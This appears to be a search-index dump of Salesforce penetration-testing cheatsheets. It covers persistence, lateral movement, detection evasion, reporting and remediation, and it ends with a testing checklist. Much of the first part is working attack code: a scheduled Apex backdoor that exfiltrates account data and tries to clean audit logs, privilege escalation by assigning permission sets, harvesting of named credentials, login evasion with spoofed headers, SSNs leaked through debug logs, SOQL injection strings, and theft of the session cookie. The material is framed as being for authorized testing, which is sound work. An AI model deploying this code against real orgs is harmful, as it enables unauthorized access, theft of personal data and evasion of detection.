newAccounts = [SELECT Id, Name, AnnualRevenue FROM Account WHERE CreatedDate = LAST_N_DAYS:1];\n        if (!newAccounts.isEmpty()) {\n            // Exfiltrate new data\n            HttpExfiltration.exfiltrateViaHttp();\n        }\n    }\n\n    private void cleanAuditLogs() {\n        // Attempt to clean audit trail evidence\n        try {\n            List&lt;SetupAuditTrail&gt; auditEntries = [SELECT Id FROM SetupAuditTrail WHERE CreatedBy.Username = 'maintenance@company-domain.com'];\n            // Note: SetupAuditTrail records cannot be deleted, but this shows intent\n        } catch (Exception e) {\n            // Audit cleaning failed\n        }\n    }\n}\n\n// Schedule the job to run daily\nSystem.schedule('Maintenance Job', '0 0 2 * * ?', new BackdoorMaintenanceJob());\n</code></pre></p> <p>Impact: Long-term unauthorized access, continued data compromise, persistent threat presence.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#3-lateral-movement","title":"3. Lateral Movement","text":"<p>Objective: Techniques for expanding access within the Salesforce ecosystem.</p> <p>Permission Set Assignment for Privilege Escalation: <pre><code>public class LateralMovement {\n    public static void escalatePrivileges(Id targetUserId) {\n        // Find high-privilege permission sets\n        List&lt;PermissionSet&gt; adminPermSets = [\n            SELECT Id, Name \n            FROM PermissionSet \n            WHERE PermissionsModifyAllData = true \n               OR PermissionsViewAllData = true\n        ];\n\n        for (PermissionSet ps : adminPermSets) {\n            try {\n                PermissionSetAssignment psa = new PermissionSetAssignment(\n                    PermissionSetId = ps.Id,\n                    AssigneeId = targetUserId\n                );\n                insert psa;\n                System.debug('Assigned permission set: ' + ps.Name);\n            } catch (Exception e) {\n                System.debug('Failed to assign: ' + ps.Name + ' - ' + e.getMessage());\n            }\n        }\n    }\n}\n</code></pre></p> <p>Sharing Rule Manipulation: <pre><code>public class SharingManipulation {\n    public static void createMaliciousSharing() {\n        // Create overly permissive account sharing rule\n        AccountSharingRule rule = new AccountSharingRule(\n            Name = 'Emergency Access Rule',\n            AccountAccessLevel = 'Edit',\n            CaseAccessLevel = 'Edit',\n            ContactAccessLevel = 'Edit',\n            OpportunityAccessLevel = 'Edit',\n            SharedToType = 'Role',\n            SharedToId = 'ROLE_ID'  // Target role ID\n        );\n\n        try {\n            insert rule;\n            System.debug('Malicious sharing rule created');\n        } catch (Exception e) {\n            System.debug('Sharing rule creation failed: ' + e.getMessage());\n        }\n    }\n}\n</code></pre></p> <p>Cross-System Integration Exploitation: <pre><code>public class IntegrationExploit {\n    @future(callout=true)\n    public static void exploitConnectedSystems() {\n        // Harvest credentials from named credentials\n        List&lt;NamedCredential&gt; credentials = [SELECT DeveloperName, Endpoint FROM NamedCredential];\n\n        for (NamedCredential cred : credentials) {\n            try {\n                HttpRequest req = new HttpRequest();\n                req.setEndpoint('callout:' + cred.DeveloperName + '/api/admin/users');\n                req.setMethod('GET');\n\n                Http http = new Http();\n                HttpResponse res = http.send(req);\n\n                if (res.getStatusCode() == 200) {\n                    // Successfully accessed connected system\n                    System.debug('Connected system accessed: ' + cred.DeveloperName);\n\n                    // Attempt to extract data or escalate privileges in connected system\n                    String responseBody = res.getBody();\n                    // Process response for additional exploitation\n                }\n            } catch (Exception e) {\n                System.debug('Connection failed: ' + cred.DeveloperName);\n            }\n        }\n    }\n}\n</code></pre></p> <p>Impact: Expanded unauthorized access, multi-system compromise, network lateral movement.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#detection-evasion","title":"Detection Evasion","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#1-audit-trail-manipulation","title":"1. Audit Trail Manipulation","text":"<p>Objective: Techniques for avoiding detection in security logs and audit trails.</p> <p>Login History Evasion: <pre><code>def evasive_login_patterns(username, password):\n    \"\"\"Use varied login patterns to avoid detection\"\"\"\n    import random\n    import time\n\n    # Vary user agents\n    user_agents = [\n        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',\n        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',\n        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'\n    ]\n\n    # Vary source IPs (if possible)\n    proxy_ips = ['192.168.1.10', '10.0.0.5', '172.16.0.20']\n\n    for i in range(5):\n        headers = {\n            'User-Agent': random.choice(user_agents),\n            'X-Forwarded-For': random.choice(proxy_ips)\n        }\n\n        # Perform login with variation\n        login_data = {'username': username, 'pw': password}\n        response = requests.post(\n            'https://instance.salesforce.com/login.jsp',\n            data=login_data,\n            headers=headers\n        )\n\n        # Random delay between attempts\n        time.sleep(random.uniform(30, 300))  # 30 seconds to 5 minutes\n</code></pre></p> <p>Setup Audit Trail Evasion: <pre><code>public class AuditEvasion {\n    public static void performStealthyActions() {\n        // Use anonymous blocks to reduce attribution\n        Database.executeBatch(new StealthyBatch(), 1);\n    }\n\n    // Batch job to distribute actions across time\n    public class StealthyBatch implements Database.Batchable&lt;SObject&gt; {\n        public Database.QueryLocator start(Database.BatchableContext bc) {\n            return Database.getQueryLocator('SELECT Id FROM Account LIMIT 1');\n        }\n\n        public void execute(Database.BatchableContext bc, List&lt;Account&gt; records) {\n            // Perform malicious actions in small batches\n            List&lt;User&gt; users = [SELECT Id, IsActive FROM User WHERE Profile.Name != 'System Administrator' LIMIT 5];\n\n            for (User u : users) {\n                // Make subtle privilege changes\n                try {\n                    // Assign temporary permission set\n                    PermissionSetAssignment psa = new PermissionSetAssignment(\n                        PermissionSetId = 'HIDDEN_PERMISSION_SET_ID',\n                        AssigneeId = u.Id,\n                        ExpirationDate = Date.today().addDays(1)  // Temporary assignment\n                    );\n                    insert psa;\n                } catch (Exception e) {\n                    // Fail silently\n                }\n            }\n        }\n\n        public void finish(Database.BatchableContext bc) {\n            // Clean up after batch completion\n        }\n    }\n}\n</code></pre></p> <p>Debug Log Pollution: <pre><code>public class LogPollution {\n    public static void polluteLogs() {\n        // Generate high volume of legitimate-looking debug logs\n        for (Integer i = 0; i &lt; 1000; i++) {\n            System.debug('Processing record batch: ' + i);\n            System.debug('Validation check passed for item: ' + i);\n            System.debug('Business rule applied successfully: ' + i);\n        }\n\n        // Hide malicious activity within noise\n        List&lt;Contact&gt; contacts = [SELECT Id, Name, SSN__c FROM Contact LIMIT 100];\n        System.debug('Processing contact records: ' + contacts.size());\n\n        // Actual malicious activity disguised as routine processing\n        for (Contact c : contacts) {\n            if (c.SSN__c != null) {\n                // Exfiltrate data disguised as routine logging\n                System.debug('Contact processed: ID=' + c.Id + ' Data=' + c.SSN__c);\n            }\n        }\n    }\n}\n</code></pre></p> <p>Impact: Reduced forensic evidence, investigation hindrance, detection avoidance.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#2-legitimate-tool-abuse","title":"2. Legitimate Tool Abuse","text":"<p>Objective: Using authorized tools and features for malicious purposes to avoid detection.</p> <p>Data Loader Abuse: <pre><code>def abuse_data_loader():\n    \"\"\"Use Data Loader for bulk data extraction\"\"\"\n    # Configure Data Loader for extraction\n    config = {\n        'sfdc.endpoint': 'https://instance.salesforce.com',\n        'sfdc.username': 'legitimate_user@company.com',\n        'sfdc.password': 'password_with_token',\n        'process.operation': 'extract',\n        'process.mappingFile': 'contact_mapping.sdl',\n        'dataAccess.type': 'csvRead',\n        'dataAccess.name': 'contacts_extract.csv'\n    }\n\n    # Extract appears as routine data maintenance\n    print(\"Performing routine data synchronization...\")\n    # Data Loader extraction process\n</code></pre></p> <p>Workbench Exploitation: <pre><code>// Use Workbench for SOQL injection testing disguised as data analysis\nconst malicious_queries = [\n    \"SELECT Id, Name FROM Account WHERE Name = 'x' UNION SELECT Id, Password__c FROM User--\",\n    \"SELECT Id FROM Contact WHERE Email = 'test' OR (SELECT COUNT() FROM User WHERE Profile.Name = 'System Administrator') &gt; 0--\"\n];\n\n// Execute via Workbench query interface\nmalicious_queries.forEach(query =&gt; {\n    console.log(\"Executing data analysis query:\", query);\n    // Execute through Workbench UI\n});\n</code></pre></p> <p>Developer Console Abuse: <pre><code>// Execute malicious code via Developer Console anonymous blocks\n// Appears as routine development/debugging activity\n\n// Data exfiltration disguised as debugging\nList&lt;Account&gt; accounts = [SELECT Id, Name, AnnualRevenue FROM Account WHERE AnnualRevenue &gt; 1000000];\nSystem.debug('High value accounts analysis:');\nfor (Account a : accounts) {\n    System.debug('Account: ' + a.Name + ' Revenue: ' + a.AnnualRevenue);\n    // Data captured in debug logs for extraction\n}\n\n// Privilege escalation disguised as testing\nUser testUser = [SELECT Id FROM User WHERE Username = 'target@company.com'];\nPermissionSetAssignment psa = new PermissionSetAssignment(\n    PermissionSetId = 'HIGH_PRIVILEGE_PERMISSION_SET_ID',\n    AssigneeId = testUser.Id\n);\ninsert psa;\nSystem.debug('Test permission assignment completed');\n</code></pre></p> <p>Browser Extension Abuse: <pre><code>// Use Salesforce Inspector for session manipulation\n// Disguised as routine administrative tasks\n\n// Extract session information\nconst sessionId = document.cookie.match(/sid_Client=([^;]+)/)[1];\nconsole.log(\"Current session for backup:\", sessionId);\n\n// Manipulate user records through Inspector\nconst userData = {\n    Id: '005XX000001b0Qw',\n    IsActive: false,\n    ProfileId: 'STANDARD_PROFILE_ID'\n};\n\n// Use Inspector's data manipulation features\nconsole.log(\"Updating user configuration:\", userData);\n</code></pre></p> <p>Impact: Detection avoidance through legitimate tool usage, plausible deniability.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#reporting-evidence-collection","title":"Reporting &amp; Evidence Collection","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#1-critical-findings-documentation","title":"1. Critical Findings Documentation","text":"<p>Objective: Systematically document security vulnerabilities with evidence and impact assessment.</p> <p>Finding Template Structure: <pre><code>## Finding: [Vulnerability Name]\n\n### Executive Summary\nBrief description of the vulnerability and its business impact.\n\n### Technical Details\n**Vulnerability Type**: [OWASP Category]\n**CVSS Score**: [Score/10]\n**Risk Level**: [Critical/High/Medium/Low]\n\n### Root Cause Analysis\nDetailed explanation of the underlying security flaw.\n\n### Proof of Concept\nStep-by-step reproduction instructions with screenshots/code.\n\n### Evidence\n- Screenshots of vulnerable configurations\n- Code snippets demonstrating the flaw\n- SOQL query results showing data exposure\n- API response samples\n\n### Business Impact\n- Data confidentiality impact\n- Integrity concerns\n- Availability risks\n- Compliance implications\n- Potential financial impact\n\n### Remediation Steps\n1. Immediate actions (workarounds)\n2. Short-term fixes\n3. Long-term security improvements\n4. Validation steps\n\n### References\n- Salesforce security documentation\n- Industry best practices\n- Compliance requirements\n</code></pre></p> <p>Evidence Collection Script: <pre><code>def collect_security_evidence():\n    \"\"\"Automated evidence collection for security findings\"\"\"\n    import json\n    import datetime\n\n    evidence = {\n        'timestamp': datetime.datetime.now().isoformat(),\n        'org_info': {},\n        'user_permissions': {},\n        'security_settings': {},\n        'vulnerable_code': {},\n        'data_exposure': {}\n    }\n\n    # Collect organizational information\n    evidence['org_info'] = {\n        'org_id': 'REDACTED_ORG_ID',\n        'instance': 'na123',\n        'edition': 'Enterprise',\n        'sandbox': False\n    }\n\n    # Document permission vulnerabilities\n    evidence['user_permissions'] = {\n        'over_privileged_users': 15,\n        'modify_all_data_users': 8,\n        'view_all_data_users': 12,\n        'guest_user_permissions': ['Read Contact', 'Read Account']\n    }\n\n    # Security configuration issues\n    evidence['security_settings'] = {\n        'password_policy': {\n            'min_length': 8,  # Below recommended 12\n            'complexity': 'Low',\n            'lockout_threshold': 10  # Above recommended 5\n        },\n        'session_security': {\n            'ip_locking': False,\n            'timeout': 480,  # 8 hours, above recommended 2\n            'concurrent_sessions': True\n        }\n    }\n\n    return evidence\n\ndef generate_executive_summary(findings):\n    \"\"\"Generate executive summary of security assessment\"\"\"\n    summary = {\n        'critical_findings': len([f for f in findings if f.risk == 'Critical']),\n        'high_findings': len([f for f in findings if f.risk == 'High']),\n        'medium_findings': len([f for f in findings if f.risk == 'Medium']),\n        'low_findings': len([f for f in findings if f.risk == 'Low']),\n        'total_findings': len(findings),\n        'overall_risk': 'High',  # Based on critical/high findings\n        'key_recommendations': [\n            'Implement MFA for all users',\n            'Review and restrict administrative permissions',\n            'Enable Platform Encryption for sensitive fields',\n            'Strengthen password policies',\n            'Implement IP restrictions'\n        ]\n    }\n    return summary\n</code></pre></p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#2-compliance-mapping","title":"2. Compliance Mapping","text":"<p>Objective: Map identified vulnerabilities to relevant compliance frameworks.</p> <p>Framework Mapping: <pre><code>def map_findings_to_compliance():\n    \"\"\"Map security findings to compliance frameworks\"\"\"\n\n    compliance_mapping = {\n        'SOX': {\n            'applicable_controls': ['Access Controls', 'Change Management', 'Data Integrity'],\n            'violated_controls': ['SOX-ITG-01', 'SOX-ITG-03'],\n            'findings': ['Over-privileged users', 'Weak password policies']\n        },\n        'PCI_DSS': {\n            'applicable_controls': ['Access Control', 'Encryption', 'Network Security'],\n            'violated_controls': ['PCI-DSS-7', 'PCI-DSS-8'],\n            'findings': ['Unencrypted credit card fields', 'Weak authentication']\n        },\n        'GDPR': {\n            'applicable_controls': ['Data Protection', 'Access Rights', 'Data Breach'],\n            'violated_controls': ['GDPR-Art25', 'GDPR-Art32'],\n            'findings': ['PII exposure', 'Inadequate access controls']\n        },\n        'HIPAA': {\n            'applicable_controls': ['Administrative Safeguards', 'Physical Safeguards', 'Technical Safeguards'],\n            'violated_controls': ['HIPAA-164.308', 'HIPAA-164.312'],\n            'findings': ['Medical data exposure', 'Missing encryption']\n        },\n        'ISO_27001': {\n            'applicable_controls': ['A.9 Access Control', 'A.10 Cryptography', 'A.12 Operations Security'],\n            'violated_controls': ['A.9.1.1', 'A.9.2.1', 'A.10.1.1'],\n            'findings': ['Access control weaknesses', 'Encryption gaps']\n        }\n    }\n\n    return compliance_mapping\n</code></pre></p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#3-risk-assessment-matrix","title":"3. Risk Assessment Matrix","text":"<p>Objective: Quantify and prioritize security risks for business decision-making.</p> <p>Risk Calculation Framework: <pre><code>def calculate_risk_score(vulnerability):\n    \"\"\"Calculate quantitative risk score\"\"\"\n\n    # Impact factors (1-5 scale)\n    impact_factors = {\n        'data_sensitivity': vulnerability.data_sensitivity,  # 1-5\n        'user_count_affected': min(vulnerability.affected_users / 100, 5),  # Scale to 1-5\n        'business_criticality': vulnerability.business_impact,  # 1-5\n        'compliance_impact': vulnerability.compliance_risk  # 1-5\n    }\n\n    # Likelihood factors (1-5 scale)\n    likelihood_factors = {\n        'exploitability': vulnerability.exploitability,  # 1-5\n        'attack_vector': vulnerability.attack_complexity,  # 1-5\n        'authentication_required': 5 - vulnerability.auth_bypass,  # Inverse scale\n        'user_interaction': 5 - vulnerability.user_interaction  # Inverse scale\n    }\n\n    # Calculate weighted scores\n    impact_score = sum(impact_factors.values()) / len(impact_factors)\n    likelihood_score = sum(likelihood_factors.values()) / len(likelihood_factors)\n\n    # Overall risk score (1-25 scale)\n    risk_score = impact_score * likelihood_score\n\n    # Risk categorization\n    if risk_score &gt;= 20:\n        risk_level = 'Critical'\n    elif risk_score &gt;= 15:\n        risk_level = 'High'\n    elif risk_score &gt;= 10:\n        risk_level = 'Medium'\n    elif risk_score &gt;= 5:\n        risk_level = 'Low'\n    else:\n        risk_level = 'Informational'\n\n    return {\n        'score': risk_score,\n        'level': risk_level,\n        'impact': impact_score,\n        'likelihood': likelihood_score\n    }\n\ndef prioritize_remediation(findings):\n    \"\"\"Prioritize remediation based on risk scores and business factors\"\"\"\n\n    prioritized_findings = sorted(findings, key=lambda x: (\n        x.risk_score,\n        x.ease_of_exploitation,\n        x.affected_user_count\n    ), reverse=True)\n\n    remediation_timeline = {\n        'immediate': [],  # Critical findings, fix within 24-48 hours\n        'short_term': [],  # High findings, fix within 1-2 weeks\n        'medium_term': [],  # Medium findings, fix within 1-3 months\n        'long_term': []  # Low findings, fix within next release cycle\n    }\n\n    for finding in prioritized_findings:\n        if finding.risk_level == 'Critical':\n            remediation_timeline['immediate'].append(finding)\n        elif finding.risk_level == 'High':\n            remediation_timeline['short_term'].append(finding)\n        elif finding.risk_level == 'Medium':\n            remediation_timeline['medium_term'].append(finding)\n        else:\n            remediation_timeline['long_term'].append(finding)\n\n    return remediation_timeline\n</code></pre></p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#remediation-hardening-recommendations","title":"Remediation &amp; Hardening Recommendations","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#1-immediate-security-controls","title":"1. Immediate Security Controls","text":"<p>Critical Actions (24-48 hours):</p> <ol> <li>Enable MFA for All Users:</li> <li>Navigate to Setup \u2192 Single Sign-On Settings \u2192 Multi-Factor Authentication</li> <li>Enable \"Multi-factor authentication for all direct UI logins\"</li> <li> <p>Require MFA for high-privilege profiles</p> </li> <li> <p>Review Administrative Permissions:    <pre><code>-- Audit and restrict users with dangerous permissions\nSELECT Id, Username, Profile.Name \nFROM User \nWHERE Profile.PermissionsModifyAllData = true \n   OR Profile.PermissionsViewAllData = true\n</code></pre></p> </li> <li> <p>Enable Session Security:</p> </li> <li>Setup \u2192 Security \u2192 Session Settings</li> <li>Enable \"Lock sessions to IP address\"</li> <li>Set session timeout to 2 hours maximum</li> <li> <p>Enable \"High assurance session required\"</p> </li> <li> <p>Implement IP Restrictions:</p> </li> <li>Setup \u2192 Security \u2192 Network Access</li> <li>Configure IP ranges for admin profiles</li> <li>Enable \"Enforce IP restrictions\" for sensitive profiles</li> </ol>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#2-short-term-security-improvements-1-2-weeks","title":"2. Short-Term Security Improvements (1-2 weeks)","text":"<ol> <li> <p>Field-Level Security Implementation:    <pre><code>// Implement proper FLS checks in all Apex code\npublic with sharing class SecureController {\n    public List&lt;Contact&gt; getContacts() {\n        if (!Schema.sObjectType.Contact.fields.SSN__c.isAccessible()) {\n            throw new AuraHandledException('Access Denied');\n        }\n        return [SELECT Id, Name, SSN__c FROM Contact WITH SECURITY_ENFORCED];\n    }\n}\n</code></pre></p> </li> <li> <p>Platform Encryption Deployment:</p> </li> <li>Setup \u2192 Security \u2192 Platform Encryption</li> <li>Enable encryption for sensitive fields (SSN, Credit Card, etc.)</li> <li> <p>Implement proper key management</p> </li> <li> <p>Sharing Model Hardening:</p> </li> <li>Review and restrict Organization-Wide Defaults</li> <li>Audit sharing rules for over-permissive access</li> <li>Implement role hierarchy properly</li> </ol>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#3-long-term-security-strategy-1-3-months","title":"3. Long-Term Security Strategy (1-3 months)","text":"<ol> <li> <p>Security Monitoring Implementation:    <pre><code>-- Create monitoring queries for suspicious activity\nSELECT Id, UserId, User.Username, LoginTime, SourceIp, Status\nFROM LoginHistory \nWHERE LoginTime = LAST_N_DAYS:1 \n  AND Status IN ('Failed', 'Invalid Password')\nORDER BY LoginTime DESC\n</code></pre></p> </li> <li> <p>Code Security Standards:</p> </li> <li>Implement mandatory code reviews</li> <li>Deploy SAST tools in CI/CD pipeline</li> <li> <p>Enforce secure coding standards</p> </li> <li> <p>Incident Response Procedures:</p> </li> <li>Develop security incident playbooks</li> <li>Implement automated threat detection</li> <li>Create user security training programs</li> </ol>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%201/#conclusion","title":"Conclusion","text":"<p>This comprehensive Salesforce pentesting cheatsheet provides expert-level guidance for security professionals conducting authorized security assessments. The methodologies, queries, and techniques documented here represent real-world attack vectors and should be used responsibly within the bounds of proper authorization.</p> <p>Key takeaways for effective Salesforce security testing:</p> <ol> <li>Focus on Custom Code: Standard Salesforce is generally secure; vulnerabilities primarily exist in custom development</li> <li>Understand the Platform: Salesforce's unique security model requires specialized knowledge</li> <li>Test Systematically: Follow a methodical approach covering all attack surfaces</li> <li>Document Thoroughly: Provide clear evidence and remediation guidance</li> <li>Think Like an Attacker: Chain vulnerabilities for maximum impact assessment</li> </ol> <p>Remember: The goal is not just to break things, but to help organizations build more secure Salesforce implementations. Use this knowledge responsibly to strengthen cloud security postures and protect sensitive business data.</p> <p>This cheatsheet represents a compilation of expert knowledge and should be used only for authorized security assessments. Always ensure proper written authorization before conducting any security testing activities.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/","title":"Salesforce   2","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#table-of-contents","title":"Table of Contents","text":"<ol> <li>Preparation &amp; Legal Considerations</li> <li>Reconnaissance &amp; Information Gathering</li> <li>Authentication &amp; Session Management</li> <li>Authorization &amp; Access Control Assessment</li> <li>Data Leak &amp; Sensitive Info Exposure</li> <li>Custom Code Security Testing</li> <li>Platform Configuration &amp; Metadata Security</li> <li>API &amp; Integration Security</li> <li>Client-Side &amp; UX Vulnerabilities</li> <li>Advanced &amp; Chainable Attack Vectors</li> <li>Persistence, Lateral Movement &amp; Post-Exploitation</li> <li>Reporting, Remediation &amp; References</li> </ol>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#1-preparation","title":"1. Preparation","text":"<p>Checklist - Test Accounts for:   - Admin, Standard User, Guest, Integration - Tooling:   - Salesforce CLI (sfdx), simple_salesforce, Postman, Burp Suite, Salesforce Inspector, PMD, browser dev tools</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#2-reconnaissance-information-gathering","title":"2. Reconnaissance &amp; Information Gathering","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#salesforce-edition-instance","title":"Salesforce Edition &amp; Instance","text":"<p>Identify org context, features, and technical footprint</p> <p>UI Navigation - Setup &gt; Company Information for Org ID, Edition, Instance</p> <p>SOQL <pre><code>SELECT OrganizationType, Edition, InstanceName FROM Organization\n</code></pre></p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#user-profile-enumeration","title":"User &amp; Profile Enumeration","text":"<p>Find high-value/admin accounts and role mappings.</p> <p>SOQL <pre><code>SELECT Id, Username, Email, Profile.Name, UserRole.Name, IsActive FROM User\nORDER BY Profile.Name\n</code></pre></p> <p>Find users with sensitive permissions: <pre><code>SELECT Assignee.Name, PermissionSet.PermissionsModifyAllData\nFROM PermissionSetAssignment\nWHERE PermissionSet.PermissionsModifyAllData = TRUE OR PermissionSet.PermissionsViewAllData = TRUE\n</code></pre></p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#public-endpoints-sites","title":"Public Endpoints &amp; Sites","text":"<p>Identify unauthenticated exposure (Sites/Communities).</p> <ul> <li>Setup &gt; Digital Experiences &gt; All Sites: Review for exposed URLs and guest content</li> <li>Manual: Visit home page while unauthenticated, try API endpoints (<code>/services/data/</code>)</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#custom-code-app-footprint","title":"Custom Code &amp; App Footprint","text":"<p>Enumerate all custom code and package attack surface.</p> <ul> <li>Setup &gt; Custom Code (Apex Classes/Triggers, Visualforce, LWC/Aura)</li> <li>Setup &gt; Installed Packages</li> <li>SOQL <pre><code>SELECT Name, NamespacePrefix, ApiVersion FROM ApexClass\nWHERE NamespacePrefix = null AND ApiVersion &lt; 45.0\n</code></pre></li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#3-authentication-session-management","title":"3. Authentication &amp; Session Management","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#password-policy-lockout","title":"Password Policy &amp; Lockout","text":"<p>Weak policies = brute force risk.</p> <ul> <li>Setup &gt; Security &gt; Password Policies</li> <li>SOQL <pre><code>SELECT MinimumPasswordLength, PasswordComplexity, LockoutInterval FROM Organization\n</code></pre></li> <li>Testing</li> <li>Hydra/Burp: Try brute force with discovered/minimal password policy</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#multi-factor-authentication-mfa","title":"Multi-Factor Authentication (MFA)","text":"<p>Check for enforcement.</p> <p>SOQL <pre><code>SELECT Id, Username, UserPreferencesMfaRequired FROM User WHERE IsActive = TRUE\n</code></pre></p> <ul> <li>Setup &gt; Security &gt; MFA: Review enforcement policy</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#session-security","title":"Session Security","text":"<p>Check for session fixation/hijacking.</p> <ul> <li>Setup &gt; Security &gt; Session Settings (IP lock, timeout, domain lock)</li> <li>Testing</li> <li>Replay session cookies from new IP/device</li> <li>Attempt session fixation via re-used session IDs</li> </ul>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#login-flows-sso","title":"Login Flows &amp; SSO","text":"<p>SOQL <pre><code>SELECT Id, DeveloperName, UsedForAuthentication FROM Flow WHERE Type = 'LoginFlow'\nSELECT Id, Name, Issuer, EntityId FROM SamlSsoConfig\n</code></pre> - Review for logic weaknesses, MFA/SAML bypasses</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#4-authorization-access-control-assessment","title":"4. Authorization &amp; Access Control Assessment","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#profile-permission-set-analysis","title":"Profile &amp; Permission Set Analysis","text":"<p>Locate over-privileged users, map escalation paths.</p> <p>SOQL: Find high-privilege/profiles permission sets <pre><code>SELECT Name, PermissionsModifyAllData, PermissionsViewAllData FROM Profile\n</code></pre> <pre><code>SELECT AssigneeId, PermissionSet.Name, PermissionSet.PermissionsModifyAllData\nFROM PermissionSetAssignment WHERE PermissionSet.PermissionsModifyAllData = TRUE\n</code></pre></p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#field-level-security-fls","title":"Field-Level Security (FLS)","text":"<p>Check for control bypass/exposed fields.</p> <p>SOQL <pre><code>SELECT Id, ParentId, Field, PermissionsRead, PermissionsEdit\nFROM FieldPermissions WHERE Field LIKE '%SSN%' OR Field LIKE '%Credit%'\n</code></pre> Test as low-priv user by querying sensitive fields (expect no access).</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#sharing-model-record-access","title":"Sharing Model &amp; Record Access","text":"<p>Find over-permissive OWD &amp; sharing rules.</p> <ul> <li>Setup &gt; Security &gt; Sharing Settings</li> </ul> <p>SOQL <pre><code>SELECT SObjectType, DefaultExternal, DefaultInternal FROM OrganizationWideDefault\n</code></pre> - Test with practical IDOR: Change record ID in URL as a low-privileged user.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#guest-user-community-exposure","title":"Guest User &amp; Community Exposure","text":"<p>SOQL <pre><code>SELECT Id, Name FROM User WHERE Profile.Name LIKE '%Guest%'\n</code></pre> - Sites &gt; Public Access Settings: Review CRUD permissions for guest profile.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#5-data-leak-sensitive-info-exposure","title":"5. Data Leak &amp; Sensitive Info Exposure","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#sensitive-data-discovery","title":"Sensitive Data Discovery","text":"<p>SOQL <pre><code>SELECT Id, Name, SSN__c FROM Contact WHERE SSN__c != NULL\n</code></pre> - Scan for custom objects/fields with possible PII/HCI.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#data-export-capabilities","title":"Data Export Capabilities","text":"<p>Where to look: - Setup &gt; Data Export; Data Loader/Workbench - Bulk data extraction using API tokens</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#reportdashboard-overexposure","title":"Report/Dashboard Overexposure","text":"<p>SOQL <pre><code>SELECT Id, Name, FolderName FROM Report WHERE FolderName = 'Public Reports'\n</code></pre> - Reports &gt; All Reports: Export as low-priv user</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#chatter-feeds-public-info","title":"Chatter, Feeds &amp; Public Info","text":"<p>SOQL <pre><code>SELECT Body, CreatedBy.Name FROM FeedItem WHERE Body LIKE '%password%' OR Body LIKE '%secret%'\n</code></pre></p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#6-custom-code-security-testing","title":"6. Custom Code Security Testing","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#soql-injection-in-apex","title":"SOQL Injection in Apex","text":"<p>Vulnerability - Dynamic SOQL using untrusted input</p> <p>Example Payload <pre><code>String userInput = \"' OR Name != '' OR '\";\nString query = 'SELECT Id, Name FROM Account WHERE Name = \\'' + userInput + '\\'';\nList&lt;Account&gt; results = Database.query(query);\n</code></pre></p> <ul> <li>Test: Submit payloads through any field/endpoint that feeds into SOQL</li> </ul> <p>Remediation: Always use bind variables (<code>WHERE Name = :userInput</code>)</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#fls-crud-bypasses","title":"FLS &amp; CRUD Bypasses","text":"<p>Vulnerability - Code ignores object/field-level security.</p> <p>Testing - As low-priv user, attempt to trigger DML or read objects/fields not granted via FLS.</p> <p>Remediation - Always call <code>isAccessible()</code>, <code>isUpdatable()</code>, utilize <code>WITH SECURITY_ENFORCED</code> in SOQL</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#xss-in-visualforcelightning","title":"XSS in Visualforce/Lightning","text":"<p>Vulnerability - Outputting unescaped user data.</p> <p>Code Example <pre><code>&lt;apex:outputText value=\"{!userInput}\" escape=\"false\"/&gt;\n</code></pre> - Inject payload: <code>&lt;script&gt;alert(42)&lt;/script&gt;</code></p> <p>Remediation - Always use <code>escape=\"true\"</code>, use sanitized variables</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#auralwc-exposures","title":"Aura/LWC Exposures","text":"<ul> <li>@AuraEnabled methods called by unintended users.</li> <li>DOM-based XSS via unsafe innerHTML</li> </ul> <p>Remediation: Set Apex Class security, avoid unsanitized DOM writes.</p>"},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#7-platform-configuration-metadata-security","title":"7. Platform Configuration &amp; Metadata Security","text":""},{"location":"Cheatsheets/DaForce/Salesforce%20-%202/#critical-settings-audit","title":"Critical Settings Audit","text":"<p>IP Whitelisting/Restrictions 